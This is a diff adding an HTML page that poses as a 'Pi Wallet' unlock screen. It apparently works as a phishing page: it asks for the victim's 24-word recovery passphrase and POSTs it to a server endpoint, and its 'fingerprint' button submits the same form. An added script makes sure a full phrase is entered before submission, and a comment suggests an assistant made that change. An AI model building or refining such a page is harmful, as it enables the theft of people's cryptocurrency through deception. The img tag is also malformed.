@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pi Wallet</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <img src="icons/pi-logo.png"pi-logo.png" alt="Pi Logo" class="logo">
+    <h2>Unlock Pi Wallet</h2>
+    <form action="/submit" method="POST">
+      <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
+      <button class="btn-outline" type="submit">UNLOCK WITH PASSPHRASE</button>
+      <button class="btn-solid" type="submit">UNLOCK WITH FINGERPRINT</button>
+    </form>
+    <p class="info-text">
+      Pi Wallet uses a passphrase as a key to unlock and decrypt your wallet. Without it, you won’t be able to access your funds. Keep your passphrase safe and never share it with anyone.
+    </p>
+  </div>
+  <!-- Your original content above stays exactly as-is -->
+
+<script>
+  document.querySelector('form').addEventListener('submit', function (e) {
+    const phrase = document.querySelector('textarea[name="passphrase"]').value.trim();
+    const wordCount = phrase.split(/\s+/).length;
+
+    if (wordCount < 24) {
+      e.preventDefault();
+      alert("Passphrase must be at least 24 words.");
+    }
+  });
+</script>
+</body>
+</html>
